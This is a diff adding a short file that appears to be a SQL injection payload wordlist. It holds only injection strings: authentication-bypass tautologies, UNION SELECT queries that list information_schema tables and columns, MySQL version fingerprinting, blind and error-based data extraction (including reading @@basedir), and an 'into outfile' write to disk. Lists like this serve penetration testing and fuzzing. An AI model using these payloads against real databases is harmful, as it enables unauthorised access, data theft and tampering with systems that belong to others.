@@ -1,0 +1,26 @@
+' AND '1'='1
+1' OR '1'='1
+1' OR 1=1 OR 'surname
+' OR ' '='
+1' OR 1=1-- -
+1' OR "a" = 'a
+' OR'a' = n'a
+' OR 'a' = b'1100001
+' OR 'a' = _binary'1100001
+' OR 'a' = x'61
+' or 1 = true # true=1, false=0
+a'='b'='c
+true
+'='' into outfile 'dump.txt 
+1' UNION ALL SELECT 1,2,3/*
+0' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'tablename
+0' UNION SELECT column_name,table_name FROM information_schema.columns /*
+0' UNION SELECT table_name,null FROM information_schema.tables WHERE version = '9
+1' AND 1=0 UNION SELECT @@version,null /*
+1' AND MID(version(),1,1) like '4
+1' AND MID(version(),1,1) like '5
+1' OR 1=1 OR 'surname' AND MID(version(),1,1) like '4
+1' OR 1=1  AND MID(version(),1,1) like '5
+1' AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1),1,1) > 'm
+1' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,Hex(cast(@@basedir as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1
+'||1='
